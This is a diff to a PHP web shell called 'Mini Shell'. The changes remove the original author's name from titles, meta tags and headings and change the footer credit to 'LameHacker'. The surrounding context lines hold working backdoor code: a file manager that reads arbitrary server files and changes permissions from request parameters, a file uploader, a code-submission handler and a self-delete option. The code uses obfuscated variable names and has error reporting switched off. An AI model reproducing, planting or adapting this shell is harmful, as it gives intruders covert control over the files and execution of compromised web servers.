@@ -2,14 +2,12 @@
 <html>
 	<head>
 		<?php error_reporting(0);?>
-		<title>Mini Shell By An0n 3xPloiTeR</title>
+		<title>Mini Shell</title>
 		<meta charset="UTF-8" />
-		<meta name="description" content="This Mini Shell is Designed By An0n 3xPloiTeR" />
+		<meta name="description" content="" />
 		<meta name="note" content="Changing The Names Wont Make You The Author :)" />
 		<meta http-equiv="refresh" content=""><!-- For Refreshing Page After 3600 Intervals of time -->
 		<meta name="about" content="Use it where other shells dont work" />
-        <meta name="author" content="An0n 3xPloiTeR,Umar Arfeen Shah" />
-        <meta name="keywords" content="An0n 3xPloiTeR,Mini Shell,Mini,Shell,An0n,3xPloiTeR,Mini Shell By An0n 3xPloiTeR,Mini Shell" />
 		<meta name="revisit-after" content="1800" />
 		<meta name="language" content="en" />
 		<meta content='general' name='rating' />
@@ -97,7 +95,7 @@
 	</head>
 	<body>
 		<div class="heading">
-			<font>An0n 3xPloiTeR Mini Shell</font><br>
+			<font>Mini Shell</font><br>
 		</div>
 		<div class="buttons"><center>
 			<a href="?server_info">
@@ -143,7 +141,7 @@ if (isset($_GET['file_manager'])) {echo '<!DOCTYPE HTML>
 						<HTML>
 						<HEAD>
 						<link href="" rel="stylesheet" type="text/css">
-						<title>An0n 3xPloiTeR File Manager</title>
+						<title>File Manager</title>
 						<style>
 						body{
 						    color: white;
@@ -196,7 +194,7 @@ if (isset($_GET['file_manager'])) {echo '<!DOCTYPE HTML>
 						</style>
 						</HEAD>
 						<BODY>
-						<H1><center>An0n 3xPloiTeR File Manager</center></H1>
+						<H1><center>File Manager</center></H1>
 						<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
 						<tr><td><font style="color:white;">Current Path : ';$_d586cea720c2 = getcwd();$_d586cea720c2 = str_replace('\\','/',$_d586cea720c2);$_19eaea116b65 = explode('/',$_d586cea720c2);function permsa($_db30bcba387e){$_62756ced6cca = fileperms($_db30bcba387e);if (($_62756ced6cca & 0xC000) == 0xC000) {$_c889a0d2bbd1 = 's';} elseif (($_62756ced6cca & 0xA000) == 0xA000) {$_c889a0d2bbd1 = 'l';} elseif (($_62756ced6cca & 0x8000) == 0x8000) {$_c889a0d2bbd1 = '-';} elseif (($_62756ced6cca & 0x6000) == 0x6000) {$_c889a0d2bbd1 = 'b';} elseif (($_62756ced6cca & 0x4000) == 0x4000) {$_c889a0d2bbd1 = 'd';} elseif (($_62756ced6cca & 0x2000) == 0x2000) {$_c889a0d2bbd1 = 'c';} elseif (($_62756ced6cca & 0x1000) == 0x1000) {$_c889a0d2bbd1 = 'p';} else {$_c889a0d2bbd1 = 'u';}$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0100) ? 'r' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0080) ? 'w' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0040) ?(($_62756ced6cca & 0x0800) ? 's' : 'x' ) :(($_62756ced6cca & 0x0800) ? 'S' : '-'));$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0020) ? 'r' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0010) ? 'w' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0008) ?(($_62756ced6cca & 0x0400) ? 's' : 'x' ) :(($_62756ced6cca & 0x0400) ? 'S' : '-'));$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0004) ? 'r' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0002) ? 'w' : '-');$_c889a0d2bbd1 .= (($_62756ced6cca & 0x0001) ?(($_62756ced6cca & 0x0200) ? 't' : 'x' ) :(($_62756ced6cca & 0x0200) ? 'T' : '-'));return $_c889a0d2bbd1;}foreach($_19eaea116b65 as $_fb685115b91f=>$_e3beccd8d39e){ if($_e3beccd8d39e == '' && $_fb685115b91f == 0){ $_3c0a4563959e = true; echo '<a href="?file_manager&path=/">/</a>'; continue; } if($_e3beccd8d39e == '') continue; echo '<a href="?file_manager&path='; for($_bad1b53b4fbb=0;$_bad1b53b4fbb<=$_fb685115b91f;$_bad1b53b4fbb++){ echo "$_19eaea116b65[$_bad1b53b4fbb]"; if($_bad1b53b4fbb != $_fb685115b91f) echo "/"; } echo '">'.$_e3beccd8d39e.'</a>/';}echo '</td></tr><tr><td>'; if(isset($_GET['filesrc'])){ echo "<tr><td>Current File : "; echo $_GET['filesrc']; echo '</tr></td></table><br />'; echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){ echo '</table><br /><center>'.$_POST['path'].'<br /><br />'; if($_POST['opt'] == 'chmod'){ if(isset($_POST['perm'])){ if(chmod($_POST['path'],$_POST['perm'])){ echo '<font color="green">Change Permission Done.</font><br />'; }else{ echo '<font color="red">Change Permission Error.</font><br />'; } } echo '<form method="POST">
 						        Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
@@ -299,7 +297,7 @@ if (isset($_POST['submit'])) {$_e04f8301a9f1 = $_POST['code'];$_9f7af403d39c = b
 		<?php
 if (isset($_GET['uploader'])) {?>
 				<center><br><br>
-				<font style="color: lawngreen; font-family: cursive; font-size: 250%;">An0n 3xPloiTeR's Uploader</font><br><br><br><br>
+				<font style="color: lawngreen; font-family: cursive; font-size: 250%;">Uploader</font><br><br><br><br>
 				<form method="POST" enctype="multipart/form-data" action="">
 					<input style="font-size: 90%;" type="file" name="files">
 					<input style="font-size: 90%;" type=submit value="Upload">
@@ -351,7 +349,7 @@ if (isset($_GET['die'])) {if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)
 }?>
 		</div>
 		<div class="footer">
-			<font>Developed By <a href="https://www.google.com/search?q=An0n 3xPloiTeR">An0n 3xPloiTeR</a></font>
+			<font>Developed By LameHacker</a></font>
 		</div>
 	</body>
 </html>
